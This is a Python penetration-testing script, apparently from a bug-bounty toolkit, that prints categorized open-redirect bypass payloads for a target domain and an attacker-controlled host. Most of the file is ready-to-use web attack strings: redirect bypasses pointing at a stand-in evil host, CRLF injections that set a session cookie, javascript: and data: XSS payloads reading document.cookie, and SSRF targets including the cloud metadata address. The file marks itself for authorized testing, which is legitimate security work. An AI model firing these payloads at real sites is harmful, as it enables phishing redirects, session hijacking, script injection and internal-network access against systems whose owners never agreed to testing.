#!/usr/bin/env python3
"""
redirect_payloads.py - open-redirect bypass payload matrix generator.
Prints the full, deduplicated bypass set for a given target host + attacker host, ready to paste into
Burp Intruder or pipe to qsreplace/httpx. This is OPEN_REDIRECT_ARSENAL.md, parameterized.

Authorized testing only. Point --evil at a host YOU control. Prove the ESCALATION (token/script/internal),
not just the hop (OPEN_REDIRECT_TESTING_GUIDE.md sections 15/16).

Usage:
  python3 redirect_payloads.py --target target.com --evil evil.example
  python3 redirect_payloads.py --target target.com --evil evil.example --category whitelist
  python3 redirect_payloads.py --target target.com --evil evil.example --url "https://target.com/login?next=PAYLOAD"
"""
import argparse, sys, urllib.parse

# cp1252-safe console on Windows
try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass


def build(target, evil):
    """Return an ordered dict: category -> [payloads]. Cheapest/highest-yield first."""
    e = evil
    t = target
    cats = {}

    cats["baseline"] = [
        f"https://{e}",
        f"https://{e}/",
        f"http://{e}",
        f"//{e}",
        f"{e}",
        f"https:{e}",
    ]

    cats["protocol_relative_backslash"] = [
        f"//{e}",
        f"/\\{e}",
        f"\\/\\/{e}",
        f"/\\/\\{e}",
        f"\\/{e}",
        f"https:/\\{e}",
        f"https:\\\\{e}",
        f"https:/{e}",
        f"///{e}",
        f"https:///{e}",
        f"////{e}",
        f"/%2f%2f{e}",
        f"/%5c{e}",
        f"/%09/{e}",
    ]

    cats["userinfo_at"] = [
        f"https://{t}@{e}",
        f"https://{t}@{e}/",
        f"https://{e}\\@{t}",
        f"https://{t}%40{e}",
        f"https://{t}%2540{e}",
        f"https://{t}:pass@{e}",
        f"https://{t}%20@{e}",
        f"https://{t}%09@{e}",
        f"//{t}@{e}",
        f"https://foo@{e}@{t}",
    ]

    cats["whitelist"] = [
        # "contains target"
        f"https://{e}/{t}",
        f"https://{e}/?x={t}",
        f"https://{e}/#{t}",
        f"https://{e}/{t}/..",
        f"https://{t}.{e}",
        f"https://{t}.{e}/",
        f"https://{e}/{t}%2f..",
        # "startsWith https://target"
        f"https://{t}\\.{e}",
        f"https://{t}%5c.{e}",
        f"https://{t}%2f%2f@{e}",
        # redirect-chain on an allowed host (edit allowed.<target> to a real allow-listed host)
        f"https://allowed.{t}/out?url=//{e}",
    ]

    cats["encoding"] = [
        f"%2f%2f{e}",
        f"%2F%5C{e}",
        f"%252f%252f{e}",
        f"https://{e}%2f%2e%2e",
        f"https://{e}%09",
        f"https://{e}%00",
        f"https://{e}%20",
        f"https://evil%00.{e}",
        f"https://{e}%23.{t}",
        f"https://{e}%3f.{t}",
    ]

    cats["unicode_idn"] = [
        f"http://evil。{e.split('.',1)[-1] if '.' in e else e}",  # U+3002 ideographic dot
        f"http://evil｡{e.split('.',1)[-1] if '.' in e else e}",  # U+FF61
        f"http://evil．{e.split('.',1)[-1] if '.' in e else e}",  # U+FF0E fullwidth dot
        f"https://{t}。{e}",
    ]

    cats["crlf"] = [
        f"https://{t}/%0d%0aLocation:%20https://{e}",
        f"https://{t}/%0d%0aSet-Cookie:%20session=attacker",
        f"https://{t}/%0d%0a%0d%0a<script>alert(document.domain)</script>",
        f"https://{t}/%E5%98%8A%E5%98%8DLocation:%20https://{e}",
        f"/%0d%0aContent-Length:%200%0d%0a%0d%0a",
    ]

    cats["javascript_data"] = [
        "javascript:alert(document.domain)",
        "javascript:alert(document.cookie)",
        "JaVaScRiPt:alert(1)",
        "java%09script:alert(1)",
        "java%0ascript:alert(1)",
        "javascript:javascript:alert(1)",
        "%6a%61%76%61%73%63%72%69%70%74:alert(1)",
        "javascript:alert(1)//",
        "data:text/html,<script>alert(document.domain)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+",
    ]

    cats["ssrf_bounce_targets"] = [
        "http://169.254.169.254/latest/meta-data/",
        "http://0x7f000001/",
        "http://2130706433/",
        "http://127.1/",
        "http://[::1]/",
        "http://127.0.0.1.nip.io/",
        "http://169.254.169.254.nip.io/",
    ]

    return cats


def main():
    ap = argparse.ArgumentParser(description="Open-redirect bypass payload matrix generator.")
    ap.add_argument("--target", required=True, help="the app's real domain, e.g. target.com")
    ap.add_argument("--evil", required=True, help="a host YOU control, e.g. evil.example")
    ap.add_argument("--category", help="only print one category (baseline, protocol_relative_backslash, "
                                       "userinfo_at, whitelist, encoding, unicode_idn, crlf, javascript_data, "
                                       "ssrf_bounce_targets)")
    ap.add_argument("--url", help="template with the literal token PAYLOAD; prints full URLs (payload url-encoded)")
    ap.add_argument("--raw", action="store_true", help="with --url, do NOT url-encode the payload")
    a = ap.parse_args()

    cats = build(a.target, a.evil)
    if a.category:
        if a.category not in cats:
            sys.exit(f"unknown category '{a.category}'. choices: {', '.join(cats)}")
        cats = {a.category: cats[a.category]}

    seen = set()
    total = 0
    for name, payloads in cats.items():
        if not a.url:
            print(f"\n# --- {name} ---")
        for p in payloads:
            if p in seen:
                continue
            seen.add(p)
            total += 1
            if a.url:
                val = p if a.raw else urllib.parse.quote(p, safe="")
                print(a.url.replace("PAYLOAD", val))
            else:
                print(p)

    if not a.url:
        print(f"\n# {total} unique payloads. Confirm with: curl -s -D - -o /dev/null '<url>' | grep -i '^location:'")
        print("# The javascript_data set only fires in a CLIENT-SIDE JS sink (section 10). ssrf_bounce_targets are for")
        print("# the redirect-on-allowed-host SSRF chain (section 12). Prove the escalation, not the hop.")


if __name__ == "__main__":
    main()
